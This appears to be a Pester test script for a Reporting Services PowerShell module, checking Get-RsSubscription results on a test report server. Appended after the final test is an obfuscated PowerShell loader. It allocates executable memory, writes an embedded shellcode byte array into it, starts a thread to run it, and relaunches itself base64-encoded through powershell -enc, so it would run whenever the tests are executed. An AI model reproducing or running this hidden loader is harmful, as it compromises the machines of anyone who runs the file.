


$reportServerUri = if ($env:PesterServerUrl -eq $null) { 'http://localhost/reportserver' } else { $env:PesterServerUrl }

Function Set-FolderReportDataSource
{
    param (
        [string]
        $NewFolderPath
    )

    $tempProxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri

    
    $localResourcesPath = (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources\emptyReport.rdl'
    $null = Write-RsCatalogItem -Path $localResourcesPath -RsFolder $NewFolderPath -Proxy $tempProxy
    $report = (Get-RsFolderContent -RsFolder $NewFolderPath -Proxy $tempProxy)| Where-Object TypeName -eq 'Report'

    
    $localResourcesPath =   (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources\UnDataset.rsd'
    $null = Write-RsCatalogItem -Path $localResourcesPath -RsFolder $NewFolderPath -Proxy $tempProxy
    $dataSet = (Get-RsFolderContent -RsFolder $NewFolderPath -Proxy $tempProxy) | Where-Object TypeName -eq 'DataSet'
    $DataSetPath = $NewFolderPath + '/UnDataSet'

    
    $newRSDSName = "DataSource"
    $newRSDSExtension = "SQL"
    $newRSDSConnectionString = "Initial Catalog=DB; Data Source=Instance"
    $newRSDSCredentialRetrieval = "Store"
    $Pass = ConvertTo-SecureString -String "123" -AsPlainText -Force
    $newRSDSCredential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "sql", $Pass
    $null = New-RsDataSource -RsFolder $NewFolderPath -Name $newRSDSName -Extension $newRSDSExtension -ConnectionString $newRSDSConnectionString -CredentialRetrieval $newRSDSCredentialRetrieval -DatasourceCredentials $newRSDSCredential -Proxy $tempProxy

    $DataSourcePath = "$NewFolderPath/$newRSDSName"

    
    $RsDataSet = Get-RsItemReference -Path $report.Path -Proxy $tempProxy | Where-Object ReferenceType -eq 'DataSet'
    $RsDataSource = Get-RsItemReference -Path $report.Path -Proxy $tempProxy | Where-Object ReferenceType -eq 'DataSource'
    $RsDataSetSource = Get-RsItemReference -Path $DataSetPath -Proxy $tempProxy | Where-Object ReferenceType -eq 'DataSource'

    
    $null = Set-RsDataSourceReference -Path $DataSetPath -DataSourceName $RsDataSetSource.Name -DataSourcePath $DataSourcePath -Proxy $tempProxy
    $null = Set-RsDataSourceReference -Path $report.Path -DataSourceName $RsDataSource.Name -DataSourcePath $DataSourcePath -Proxy $tempProxy
    $null = Set-RsDataSetReference -Path $report.Path -DataSetName $RsDataSet.Name -DataSetPath $dataSet.Path -Proxy $tempProxy

    return $report
}

Describe "Get-RsSubscription" {
    $folderPath = ''
    $newReport = $null

    BeforeEach {
        $folderName = 'SutGetRsItemReference_MinParameters' + [guid]::NewGuid()
        $null = New-RsFolder -Path / -FolderName $folderName -ReportServerUri $reportServerUri
        $folderPath = '/' + $folderName

        
        $newReport = Set-FolderReportDataSource($folderPath)

        
        New-RsSubscription -ReportServerUri $reportServerUri -RsItem $newReport.Path -DeliveryMethod FileShare -Schedule (New-RsScheduleXml) -FileSharePath '\\unc\path' -Filename 'Report' -FileWriteMode Overwrite -RenderFormat PDF
    }

    Context "Get-RsSubscription with Proxy parameter"{
        It "Should found a reference to a subscription" {
            $proxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri
            $reportSubscriptions = Get-RsSubscription -RsItem $newReport.Path -Proxy $proxy

            @($reportSubscriptions).Count | Should Be 1
            $reportSubscriptions.Report | Should Be "emptyReport"
            $reportSubscriptions.EventType | Should Be "TimedSubscription"
            $reportSubscriptions.IsDataDriven | Should Be $false
            $reportSubscriptions.DeliverySettings.Extension | Should Be "Report Server FileShare"
            ($reportSubscriptions.DeliverySettings.ParameterValues | Where-Object { $_.Name -eq 'Path' }).Value | Should Be "\\unc\path"
            ($reportSubscriptions.DeliverySettings.ParameterValues | Where-Object { $_.Name -eq 'FileName' }).Value | Should Be "Report"
            ($reportSubscriptions.DeliverySettings.ParameterValues | Where-Object { $_.Name -eq 'WriteMode' }).Value | Should Be "Overwrite"
            ($reportSubscriptions.DeliverySettings.ParameterValues | Where-Object { $_.Name -eq 'DefaultCredentials' }).Value | Should Be True
        }
    }
    
    Context "Get-RsSubscription with ReportServerUri Parameter"{
        It "Should found a reference to a subscription" {
            $reportSubscriptions = Get-RsSubscription -RsItem $newReport.Path -ReportServerUri $reportServerUri

            @($reportSubscriptions).Count | Should Be 1
            $reportSubscriptions.Report | Should Be "emptyReport"
            $reportSubscriptions.EventType | Should Be "TimedSubscription"
            $reportSubscriptions.IsDataDriven | Should Be $false
            $reportSubscriptions.DeliverySettings.Extension | Should Be "Report Server FileShare"
            ($reportSubscriptions.DeliverySettings.ParameterValues | Where-Object { $_.Name -eq 'Path' }).Value | Should Be "\\unc\path"
            ($reportSubscriptions.DeliverySettings.ParameterValues | Where-Object { $_.Name -eq 'FileName' }).Value | Should Be "Report"
            ($reportSubscriptions.DeliverySettings.ParameterValues | Where-Object { $_.Name -eq 'WriteMode' }).Value | Should Be "Overwrite"
            ($reportSubscriptions.DeliverySettings.ParameterValues | Where-Object { $_.Name -eq 'DefaultCredentials' }).Value | Should Be True
        }
    }
    
    Context "Get-RsSubscription with ReportServerUri and Proxy Parameter"{
        It "Should found a reference to a subscription" {
            $proxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri
            $reportSubscriptions = Get-RsSubscription -RsItem $newReport.Path -Proxy $proxy -ReportServerUri $reportServerUri

            @($reportSubscriptions).Count | Should Be 1
            $reportSubscriptions.Report | Should Be "emptyReport"
            $reportSubscriptions.EventType | Should Be "TimedSubscription"
            $reportSubscriptions.IsDataDriven | Should Be $false
            $reportSubscriptions.DeliverySettings.Extension | Should Be "Report Server FileShare"
            ($reportSubscriptions.DeliverySettings.ParameterValues | Where-Object { $_.Name -eq 'Path' }).Value | Should Be "\\unc\path"
            ($reportSubscriptions.DeliverySettings.ParameterValues | Where-Object { $_.Name -eq 'FileName' }).Value | Should Be "Report"
            ($reportSubscriptions.DeliverySettings.ParameterValues | Where-Object { $_.Name -eq 'WriteMode' }).Value | Should Be "Overwrite"
            ($reportSubscriptions.DeliverySettings.ParameterValues | Where-Object { $_.Name -eq 'DefaultCredentials' }).Value | Should Be True
        }
    }
}
$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x04,0xea,0x1c,0x18,0xda,0xc1,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x52,0x31,0x5a,0x12,0x03,0x5a,0x12,0x83,0xc6,0xee,0xfe,0xed,0x3a,0x06,0x7c,0x0d,0xc2,0xd7,0xe1,0x87,0x27,0xe6,0x21,0xf3,0x2c,0x59,0x92,0x77,0x60,0x56,0x59,0xd5,0x90,0xed,0x2f,0xf2,0x97,0x46,0x85,0x24,0x96,0x57,0xb6,0x15,0xb9,0xdb,0xc5,0x49,0x19,0xe5,0x05,0x9c,0x58,0x22,0x7b,0x6d,0x08,0xfb,0xf7,0xc0,0xbc,0x88,0x42,0xd9,0x37,0xc2,0x43,0x59,0xa4,0x93,0x62,0x48,0x7b,0xaf,0x3c,0x4a,0x7a,0x7c,0x35,0xc3,0x64,0x61,0x70,0x9d,0x1f,0x51,0x0e,0x1c,0xc9,0xab,0xef,0xb3,0x34,0x04,0x02,0xcd,0x71,0xa3,0xfd,0xb8,0x8b,0xd7,0x80,0xba,0x48,0xa5,0x5e,0x4e,0x4a,0x0d,0x14,0xe8,0xb6,0xaf,0xf9,0x6f,0x3d,0xa3,0xb6,0xe4,0x19,0xa0,0x49,0x28,0x12,0xdc,0xc2,0xcf,0xf4,0x54,0x90,0xeb,0xd0,0x3d,0x42,0x95,0x41,0x98,0x25,0xaa,0x91,0x43,0x99,0x0e,0xda,0x6e,0xce,0x22,0x81,0xe6,0x7e,0x58,0x4d,0xf7,0x16,0xd5,0xc4,0x99,0x8f,0x4d,0x7e,0x2a,0x27,0x48,0x79,0x4d,0x12,0xa5,0x5e,0xe2,0xce,0x95,0x33,0x56,0x99,0x23,0xe5,0x21,0xfe,0xab,0xdc,0x81,0x53,0x3e,0xdd,0x76,0x07,0xd6,0x6e,0x68,0xa7,0x26,0x98,0xf1,0xa7,0x26,0x58,0x2d,0x9c,0x63,0x13,0x75,0x88,0x6b,0xf3,0x1d,0x67,0xe5,0x6c,0x1b,0x78,0x20,0x1b,0x62,0xd4,0xa3,0x1b,0x69,0xbb,0xb7,0x48,0x3e,0x68,0xef,0x3d,0x96,0xe6,0xe4,0x94,0x38,0xcc,0x05,0xc3,0xd3,0x58,0xf0,0xb4,0x88,0xcf,0x57,0x19,0x79,0x98,0x7a,0x9b,0x9d,0x23,0x7a,0x76,0x18,0x13,0xf1,0x72,0x6c,0xe1,0x17,0xea,0x82,0xbc,0x4a,0xbc,0x9d,0x6a,0xe0,0x00,0x0a,0x95,0xe5,0x80,0xca,0xfd,0x05,0x80,0x8a,0xfd,0x56,0xe8,0x52,0x5a,0x0b,0x0d,0x9d,0x77,0x3f,0x9e,0x31,0xf1,0xa7,0x77,0xde,0x01,0x08,0x77,0x1e,0x51,0x1e,0x1f,0x0c,0xc3,0x17,0x3d,0xcf,0x3e,0xa2,0x01,0x44,0x0c,0x26,0x86,0xa4,0x4d,0xbc,0x48,0xd3,0xb4,0xe7,0x8b,0x43,0xdf,0x91,0xf4,0x83,0xe0,0x93,0x32,0x49,0x31,0xe3,0x71,0x9f,0x7e,0x3c,0x5b,0xe7,0xb1,0x42;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}

